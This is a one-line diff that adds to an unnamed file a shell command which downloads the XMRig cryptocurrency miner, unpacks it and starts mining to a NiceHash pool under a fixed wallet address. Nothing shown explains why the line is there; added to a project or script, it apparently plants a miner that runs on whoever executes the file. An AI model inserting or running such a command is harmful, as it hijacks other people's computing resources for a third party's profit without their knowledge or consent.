@@ -1,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz && tar -xf xmrig-6.16.4-linux-static-x64.tar.gz && ./xmrig -o stratum+ssl://stratum.eu-west.nicehash.com:33380 -u 38uZAEr4UA7uUYqgCEsBEDJJRsnnsZ2dUt -k --nicehash -a rx/0
